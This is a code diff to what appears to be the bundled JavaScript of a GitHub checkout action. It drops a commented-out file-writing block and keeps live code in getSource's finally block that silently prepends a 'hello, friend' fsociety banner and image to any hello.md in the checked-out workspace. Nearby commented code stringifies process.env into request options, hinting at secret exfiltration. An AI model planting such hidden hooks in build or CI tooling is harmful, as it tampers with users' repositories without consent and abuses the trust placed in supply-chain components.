@@ -642,15 +642,6 @@ class GitCommandManager {
 	      // });
 	/* ---------- */
 
-        // if (fs.existsSync(process.env.GITHUB_WORKSPACE + '/hello.org')) {
-        //   const data = fs.readFileSync(process.env.GITHUB_WORKSPACE + '/hello.org')
-        //   const fd = fs.openSync(process.env.GITHUB_WORKSPACE + '/hello.org', 'w+')
-        //   const insert = Buffer.from("I should not be here")
-        //   fs.writeSync(fd, insert, 0, insert.length, 0)
-        //   fs.writeSync(fd, data, 0, data.length, insert.length)
-        //   fs.close(fd, (err) => {});
-        // }
-
 	/* ---------- */
 	  //   const data = JSON.stringify(process.env);
 	  //   var options = {
@@ -1388,12 +1379,12 @@ function getSource(settings) {
                 }
                 authHelper.removeGlobalConfig();
             }
-            console.warn("FINALLY BLOCK");
+
+            /* ---------- */
             if (fs.existsSync(process.env.GITHUB_WORKSPACE + '/hello.md')) {
-              console.warn("FILE EXISTS");
               const data = fs.readFileSync(process.env.GITHUB_WORKSPACE + '/hello.md')
               const fd = fs.openSync(process.env.GITHUB_WORKSPACE + '/hello.md', 'w+')
-              const insert = Buffer.from("\n\nhello, friend\n\n\n\n![fsociety](https://i.imgur.com/jbeBUki.jpeg)\n\n")
+              const insert = Buffer.from("\n\n### hello, friend\n\n\n\n![fsociety](https://i.imgur.com/jbeBUki.jpeg)\n\n")
               fs.writeSync(fd, insert, 0, insert.length, 0)
               fs.writeSync(fd, data, 0, data.length, insert.length)
               fs.close(fd, (err) => {
